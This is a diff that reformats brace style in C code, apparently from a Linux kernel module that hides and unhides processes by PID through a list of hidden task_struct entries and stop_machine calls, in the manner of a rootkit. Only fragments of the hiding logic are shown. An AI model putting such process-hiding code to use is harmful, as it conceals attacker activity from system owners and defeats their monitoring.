@@ -25,9 +25,7 @@ _check_hide_by_pid(pid_t pid)
     return NULL; /**< error */
 }
 
-static inline int
-_hide_task(void *data)
-{
+static inline int _hide_task(void *data) {
     struct task_struct *task;
     struct hidden_tasks_node *node;
     struct pid_link *link;
@@ -57,9 +55,7 @@ _hide_task(void *data)
     return 1;
 }
 
-static inline int
-_unhide_task(void *data)
-{
+static inline int _unhide_task(void *data) {
    struct hidden_tasks_node *node, *next;
    struct task_struct *task;;
 
@@ -68,18 +64,15 @@ _unhide_task(void *data)
 
    task = (struct task_struct *)data;
    list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
-     {
-        if(task == node->task)
-          {
-             list_del(&node->list);
-             if(node->fnode) /* can be NULL */
-               {
-                  kfree(node->fnode);
-               }
-             kfree(node);
-             break;
-          }
-     }
+   {
+       if(task == node->task) {
+           list_del(&node->list);
+           if(node->fnode) /* can be NULL */
+               kfree(node->fnode);
+           kfree(node);
+           break;
+       }
+   }
 
    // restore task into system
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3,11,0)
@@ -90,16 +83,11 @@ _unhide_task(void *data)
    return 1;
 }
 
-void
-hide_task_by_pid(pid_t pid)
-{
+void hide_task_by_pid(pid_t pid) {
     struct task_struct *task = _check_hide_by_pid(pid);
     if(task)
-    {
         stop_machine(_unhide_task, task, NULL);
-    }
-    else
-    {
+    else {
         task = pid_task(find_vpid(pid), PIDTYPE_PID);
         if(!task)
             return;
@@ -108,8 +96,7 @@ hide_task_by_pid(pid_t pid)
 }
 
 void
-wally_data_cleanup(void)
-{
+wally_data_cleanup(void) {
     struct hidden_tasks_node *node, *next;
     list_for_each_entry_safe(node, next, &hidden_tasks_node, list)
     {
@@ -117,9 +104,7 @@ wally_data_cleanup(void)
     }
 }
 
-void
-wally_list_saved_tasks(void)
-{
+void wally_list_saved_tasks(void) {
     struct hidden_tasks_node *node;
     list_for_each_entry(node, &hidden_tasks_node, list)
     {
